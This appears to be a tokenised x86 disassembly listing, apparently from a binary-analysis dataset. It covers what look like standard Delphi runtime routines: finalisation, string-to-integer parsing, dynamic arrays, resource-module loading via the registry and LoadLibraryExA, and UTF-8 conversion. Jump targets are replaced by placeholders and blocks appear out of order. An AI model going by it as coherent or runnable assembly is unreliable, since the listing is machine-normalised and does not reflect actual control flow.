mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4046b0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_40480c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4045b4
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40459c
mov ebx eax
mov eax [ edi ]
call sub_404730
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028c8
mov eax esi
sub_404850
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404880
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404880
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404880
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404850
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404920
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_40496c
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_40496c
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403edc
jmp r-xdata
call sub_403eb8
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4045dc
jmp r-xdata
call sub_4045c4
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404954
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_40496c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404920
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4057b4
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4050d4
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402828
sub_404a7c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028c8
mov edx [ eax + esi ]
add eax ebx
call sub_403f0c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404600
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a64
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028c8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b98
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a7c
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4057cc
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405110
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404b98
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403f0c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404600
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a64
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b98
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a7c
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4057cc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405110
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404cb8
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404cdc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402908
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402908
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404cb8
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_404f3c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404f34
jmp r-xdata
mov al 0x4
call sub_402828
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402828
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40270c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b34
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_40496c
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028c8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b34
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404f1c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404f3c
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4050d4
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026ec
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_40496c
sub_405110
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4050d4
pop edx
pop eax
sub_405138
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012dc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405168
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40126c
mov eax esp
mov dl 0x1
call sub_4053a4
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4051b0
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405168
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4051ec
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401274
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40127c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4051d8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4051d8
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4051d8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40124c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401244
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4053a4
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40126c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4054a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4051ec
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40128c
push eax
call sub_401264
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40561c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_405168
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_405678
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
jmp r-xdata
sub_4056d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405713
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405744
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4057a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4056d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4057af
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4057cc
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4057f8
test edx edx
je sub_4057b4
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402828
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_40589c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4058c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4059a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
